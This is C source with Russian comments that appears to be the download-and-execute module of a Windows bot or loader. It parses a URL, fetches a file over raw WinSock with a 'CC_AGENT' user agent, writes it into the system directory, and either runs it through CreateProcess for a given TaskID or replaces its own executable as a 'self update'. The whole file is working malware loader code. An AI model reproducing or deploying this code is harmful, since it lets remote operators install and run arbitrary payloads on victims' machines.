// ------------------
// parse_url
// парсинг ссылок
// ------------------
void WINAPI Parse_Url(char *url, char *host, char *path)
{
	char *p = strstr(url, "http://");
	if (p)
		url += 7;
	
	p = strstr(url, "/");
	if (p)
	{
		lstrcpy(path, p);
		strncpy(host, url, p - url);
	}
}

// ------------------
// DownloadFile
// скачка файла посредством WinSock2 API
// ------------------
DWORD WINAPI DownloadFile(char *Host, short *Port, char *Path, char *SaveTo)
{
	SOCKET 		 		HTTPsock; 
	SOCKADDR_IN  		HTTPsockin;
	
	DWORD dwIpAddr = GetIpByHostname(Host);
	
	if(dwIpAddr == 0) return FALSE;
	
	HTTPsockin.sin_addr.S_un.S_addr    =   dwIpAddr;
	HTTPsockin.sin_family              =   AF_INET;
	HTTPsockin.sin_port                =   htons((short)Port);
	HTTPsock                           =   socket(AF_INET, SOCK_STREAM, 0);
	
	char 		GetPack[1024];
	wsprintf(GetPack, "GET /%s HTTP/1.0\r\nUser-Agent: %s\r\nHost: %s\r\n\r\n", Path, CC_AGENT, Host);
	
	int i = connect(HTTPsock, (struct sockaddr *)&HTTPsockin, sizeof(HTTPsockin)); 
		if(i == SOCKET_ERROR) return FALSE;
		
	i = send(HTTPsock, GetPack, lstrlen(GetPack), 0);
		if(i == SOCKET_ERROR) return FALSE;
		
	DWORD 	dwSize 		= 	1;
	int 	CrLfCount 	= 	0; 
	
	HGLOBAL 	hMem			=   (char*)GlobalAlloc(GPTR, 2);
	char 		*recvbuffer  	= 	(char*)hMem;
	
	HANDLE hFile = CreateFile(SaveTo, GENERIC_READ | GENERIC_WRITE,
					0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
					
	if (hFile == INVALID_HANDLE_VALUE) 
		return FALSE;
		
	SetFilePointer(hFile, 0, 0, FILE_END);
		
	while(i = recv(HTTPsock, recvbuffer, 1, 0))
	{
		if(i == SOCKET_ERROR) 
			break;
			
		if(CrLfCount == 4)   /* CR+LF+CR+LF == /x0d/x0a/x0d/x0a                   */
			CrLfCount = -1;  /* then stop checking for CRL\LFs in HTTP header */
			
		if(CrLfCount != -1)
		{
			// todo: check 200 ok
			if((lstrcmp(recvbuffer,"\r")==0) || (lstrcmp(recvbuffer,"\n")==0))
				CrLfCount = CrLfCount + 1;
			else 
			if(CrLfCount != 0)
				CrLfCount = CrLfCount - 1;
		}
		else
		{	
			WriteFile(hFile, recvbuffer, dwSize, &dwSize, 0);
		}
		
		// GlobalReAlloc ?!
		GlobalFree(hMem); hMem	= (char*)GlobalAlloc(GPTR, 2);
	}
	
	CloseHandle(hFile);
	GlobalFree(hMem);
	return TRUE;
}

// ------------------
// DownloadAndExec
// скачка и запуск PE-файла
// modes:
// 1 - download & exec
// 2 - update self
// ------------------
DWORD WINAPI DownloadAndExecuteFile(char *FileUrl, char *TaskID, int mode)
{
	char 	SysBuf[MAX_PATH], TmpPath[MAX_PATH];

	GetSystemDirectory(SysBuf, MAX_PATH);
	
	char url[256], host[256], path[256];
	
	 ZeroMemory(host, sizeof(host)); ZeroMemory(path, sizeof(path));	
	 
	Parse_Url(FileUrl, host, path);

	if(mode == 1)
	{
		GetTempFileName(SysBuf, "STX", 0, TmpPath);
	}
	else
	{
		wsprintf(TmpPath, "%s//%s", SysBuf, EXE_NAME);
		DeleteFile(TmpPath);
	}

	if(!DownloadFile(host, (short*)80, path, TmpPath))    
		return FALSE;
	
	if(mode == 1)
	{
		STARTUPINFO si = { sizeof(si) };
		PROCESS_INFORMATION pi;

		CreateProcess(NULL, TmpPath, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
		
	}

	return TRUE;
}